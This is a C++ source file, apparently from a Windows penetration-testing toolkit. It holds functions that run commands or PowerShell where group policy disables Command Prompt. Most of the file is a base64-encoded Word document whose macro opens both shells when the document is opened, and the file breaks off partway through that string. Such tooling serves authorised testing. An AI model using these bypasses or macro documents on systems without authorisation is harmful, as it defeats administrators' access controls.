#include ".\lib\invoker\invoker.h"
#include ".\lib\base64\base64.h"

// ----------------------------------- SHELL -----------------------------------

void SYSTEM_InvokeShell() {
	Output("################################# EXAMPLES #################################");
	Output("# Command : WHOAMI /PRIV                                                   #");
	Output("################################### NOTE ###################################");
	Output("# If Command Prompt is disabled by a group policy, enter a command.        #");
	Output("############################################################################");
	Output("");
	std::string command = Input("Enter command (optional)");
	Output("");
	ShellExec(command);
}

void SYSTEM_InvokePowerShell() {
	PowerShellExec();
}

void MS_InvokeShells() {
	Output("################################### NOTE ###################################");
	Output("# Command Prompt and PowerShell will run in a new window on document open. #");
	Output("############################################################################");
	Output("");
	// NOTE: Microsoft Word document encoded in Base64.
	std::string encoded = std::string("0M8R4KGxGuEAAAAAAAAAAAAAAAAAAA").append("AAPgADAP7/CQAGAAAAAAAAAAAAAAAB").append("AAAAMAAAAAAAAAAAEAAAMwAAAAIAAA").append("D+////AAAAAC8AAAD/////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("///////////////////////spcEACw").append("AaBAAA8BK/AAAAAAAAEAAAAAAACAAA").append("YwgAAA4AYmpiauZ65noAAAAAAAAAAA").append("AAAAAAAAAAAAAaBBYANA4AAIQQUGeE").append("EFBnYwAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAD//w8AAAAAAAAA").append("AAD//w8AAAAAAAAAAAD//w8AAAAAAA").append("AAAAAAAAAAAAAAALcAAAAAAFIHAAAA").append("AAAAUgcAAOoUAAAAAAAA6hQAAAAAAA").append("DqFAAAAAAAAOoUAAAAAAAA6hQAABQA").append("AAAAAAAAAAAAAP////8AAAAA/hQAAA").append("AAAAD+FAAAAAAAAP4UAAAAAAAA/hQA").append("AAwAAAAKFQAADAAAAP4UAAAAAAAAmB").append("cAAAwCAAAWFQAAAAAAABYVAAAAAAAA").append("FhUAAAAAAAAWFQAAAAAAABYVAAAAAA").append("AA8RUAAAAAAADxFQAAAAAAAPEVAAAA").append("AAAAFxcAAAIAAAAZFwAAAAAAABkXAA").append("AAAAAAGRcAAAAAAAAZFwAAAAAAABkX").append("AAAAAAAAGRcAACQAAACkGQAAtgIAAF").append("ocAAA+AAAAPRcAABUAAAAAAAAAAAAA").append("AAAAAAAAAAAA6hQAAAAAAADxFQAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAADxFQAA").append("AAAAAPEVAAAAAAAA8RUAAAAAAADxFQ").append("AAAAAAAD0XAAAAAAAAAAAAAAAAAADq").append("FAAAAAAAAOoUAAAAAAAAFhUAAAAAAA").append("AAAAAAAAAAABYVAADbAAAAUhcAABYA").append("AADHFgAAAAAAAMcWAAAAAAAAxxYAAA").append("AAAADxFQAAlAAAAOoUAAAAAAAAFhUA").append("AAAAAADqFAAAAAAAABYVAAAAAAAAFx").append("cAAAAAAAAAAAAAAAAAAMcWAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAA8RUAAAAAAAAXFwAAAAAAAAAAAA").append("AAAAAAxxYAAAAAAAAAAAAAAAAAAMcW").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAxxYAAAAAAAAWFQAA").append("AAAAAP////8AAAAAYPOiGe3A1gEAAA").append("AAAAAAAP////8AAAAAhRYAABwAAADH").append("FgAAAAAAAAAAAAAAAAAAAxcAABQAAA").append("BoFwAAMAAAAJgXAAAAAAAAxxYAAAAA").append("AACYHAAAAAAAAKEWAAAWAAAAmBwAAA").append("AAAADHFgAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAJgcAAAAAA").append("AAAAAAAAAAAADqFAAAAAAAAMcWAAA8").append("AAAA8RUAAAAAAADxFQAAAAAAAMcWAA").append("AAAAAA8RUAAAAAAADxFQAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAA8RUAAAAAAADxFQAAAAAA").append("APEVAAAAAAAAPRcAAAAAAAA9FwAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAtxYAABAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAPEVAAAAAAAA8RUAAAAAAA").append("DxFQAAAAAAAJgXAAAAAAAA8RUAAAAA").append("AADxFQAAAAAAAPEVAAAAAAAA8RUAAA").append("AAAAAAAAAAAAAAAP////8AAAAA////").append("/wAAAAD/////AAAAAAAAAAAAAAAA//").append("///wAAAAD/////AAAAAP////8AAAAA").append("/////wAAAAD/////AAAAAP////8AAA").append("AA/////wAAAAD/////AAAAAP////8A").append("AAAA/////wAAAAD/////AAAAAP////").append("8AAAAA/////wAAAAD/////AAAAAJgc").append("AAAAAAAA8RUAAAAAAADxFQAAAAAAAP").append("EVAAAAAAAA8RUAAAAAAADxFQAAAAAA").append("APEVAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAADxFQ").append("AAAAAAAPEVAAAAAAAA8RUAAAAAAABS").append("BwAAXgwAALATAAA6AQAABQASAQAAGg").append("QECAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAENvbW1h").append("bmQgUHJvbXB0IGFuZCBQb3dlclNoZW").append("xsIHdpbGwgbm93IG9wZW4gaW4gYSBu").append("ZXcgd2luZG93Lg1QcmVzcyBBbHQgKy").append("BGMTEgdG8gb3BlbiBtYWNybyBlZGl0").append("b3IuDQAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAgAACMIAAAkCA").append("AAJwgAADwIAAA9CAAAUAgAAGEIAABi").append("CAAAYwgAAPz8/Pz8+Pz49AAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAGFmgLDjMAAAYWaFdL3QAABh").append("Zo8wuJAAkACAAAPQgAAGMIAAD9AAAA").append("AAAAAAAAAAAA/QAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAABAAAA").append("AjIAMZBoATpwvEydAB+wgi4gsMZBIb").append("CgBSKwoAUjkKAFJJCgBSWwAAAXsMQC").append("GLDEAgyQxAIAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAACIGDw").append("ASAAEAeAEPAAcAAwAEAAMAAgAEAAgA").append("AACYAAAAngAAAJ4AAACeAAAAngAAAJ").append("4AAACeAAAAngAAAJ4AAAA2BgAANgYA").append("ADYGAAA2BgAANgYAADYGAAA2BgAANg").append("YAADYGAAB2AgAAdgIAAHYCAAB2AgAA").append("dgIAAHYCAAB2AgAAdgIAAHYCAAA2Bg").append("AANgYAADYGAAA2BgAANgYAADYGAAA+").append("AgAANgYAADYGAAA2BgAANgYAADYGAA").append("A2BgAANgYAADYGAAA2BgAANgYAADYG").append("AAA2BgAANgYAADYGAAA2BgAANgYAAD").append("YGAAA2BgAANgYAADYGAAA2BgAANgYA").append("ADYGAAA2BgAANgYAADYGAAA2BgAAqA").append("AAADYGAAA2BgAAFgAAADYGAAA2BgAA").append("NgYAADYGAAA2BgAANgYAADYGAAA2Bg").append("AAuAAAADYGAAA2BgAANgYAADYGAAA2").append("BgAANgYAADYGAAA2BgAANgYAADYGAA").append("A2BgAANgYAAGgBAABIAQAANgYAADYG").append("AAA2BgAANgYAADYGAAA2BgAANgYAAD").append("YGAAA2BgAANgYAADYGAAA2BgAANgYA").append("ADYGAAA2BgAANgYAADYGAAA2BgAANg").append("YAADYGAAA2BgAANgYAADYGAAA2BgAA").append("NgYAADYGAAA2BgAANgYAADYGAAA2Bg").append("AANgYAADYGAAA2BgAANgYAADYGAAA2").append("BgAANgYAADYGAAA2BgAANgYAADYGAA").append("A2BgAANgYAADYGAAA2BgAANgYAADYG").append("AAA2BgAANgYAADYGAAA2BgAANgYAAD").append("YGAAA2BgAANgYAADYGAAA2BgAANgYA").append("ADYGAAA2BgAANgYAADYGAAA2BgAANg").append("YAADYGAABwAgAANgYAADIGAAAYAAAA").append("xgMAANYDAADmAwAA9gMAAAYEAAAWBA").append("AAJgQAADYEAABGBAAAVgQAAGYEAAB2").append("BAAAhgQAAJYEAADGAwAA1gMAAOYDAA").append("D2AwAABgQAABYEAAAyBgAAKAIAANgB").append("AADoAQAAJgQAADYEAABGBAAAVgQAAG").append("YEAAB2BAAAhgQAAJYEAADGAwAA1gMA").append("AOYDAAD2AwAABgQAABYEAAAmBAAANg").append("QAAEYEAABWBAAAZgQAAHYEAACGBAAA").append("lgQAAMYDAADWAwAA5gMAAPYDAAAGBA").append("AAFgQAACYEAAA2BAAARgQAAFYEAABm").append("BAAAdgQAAIYEAACWBAAAxgMAANYDAA").append("DmAwAA9gMAAAYEAAAWBAAAJgQAADYE").append("AABGBAAAVgQAAGYEAAB2BAAAhgQAAJ").append("YEAADGAwAA1gMAAOYDAAD2AwAABgQA").append("ABYEAAAmBAAANgQAAEYEAABWBAAAZg").append("QAAHYEAACGBAAAlgQAAMYDAADWAwAA").append("5gMAAPYDAAAGBAAAFgQAACYEAAA2BA").append("AARgQAAFYEAABmBAAAdgQAAIYEAACW").append("BAAAOAEAAFgBAAD4AQAACAIAABgCAA").append("BWAgAAfgIAAJACAACgAgAAsAIAAMAC").append("AADQAgAAgAIAAOACAADwAgAAAAMAAB").append("ADAAAgAwAAMAMAAEADAADgAgAA8AIA").append("AAADAAAQAwAAIAMAADADAABAAwAA4A").append("IAAPACAAAAAwAAEAMAACADAAAwAwAA").append("QAMAAOACAADwAgAAAAMAABADAAAgAw").append("AAMAMAAEADAADgAgAA8AIAAAADAAAQ").append("AwAAIAMAADADAABAAwAA4AIAAPACAA").append("AAAwAAEAMAACADAAAwAwAAQAMAAOAC").append("AADwAgAAAAMAABADAAAgAwAAMAMAAE").append("ADAADgAgAA8AIAAAADAAAQAwAAIAMA").append("ADADAABAAwAA4AIAAPACAAAAAwAAEA").append("MAACADAAAwAwAAQAMAAOACAADwAgAA").append("AAMAABADAAAgAwAAMAMAAEADAADgAg").append("AA8AIAAAADAAAQAwAAIAMAADADAABA").append("AwAA4AIAAPACAAAAAwAAEAMAACADAA").append("AwAwAAQAMAAOACAADwAgAAAAMAABAD").append("AAAgAwAAMAMAAEADAADgAgAA8AIAAA").append("ADAAAQAwAAIAMAADADAABAAwAANgYA").append("ADYGAAA2BgAANgYAADYGAAAkAAAAT0").append("oDAFBKBABRSgMAXkoCAF9IAQRtSBoE").append("bkgECHNIGgR0SAQIAAAAAE4AAGDx/w").append("IATgAMEAAAAAAAAAAABgBOAG8AcgBt").append("AGEAbAAAAAwAAAASZAMBAQAUpKAAHA").append("BDShYAX0gBBGFKFgBtSBoEbkgECHNI").append("GgR0SAQIAAAAAAAAAAAAAAAAAAAAAA").append("AAPgBBIPL/oQA+AAwNAAAAAAAAEAAT").append("AFoAYQBkAGEAbgBpACAAZgBvAG4AdA").append("AgAG8AZABsAG8AbQBrAGEAAAAAAFYA").append("aQDz/7MAVgAMDQAAAAAAADAGDgBPAG").append("IAaQANAW4AYQAgAHQAYQBiAGwA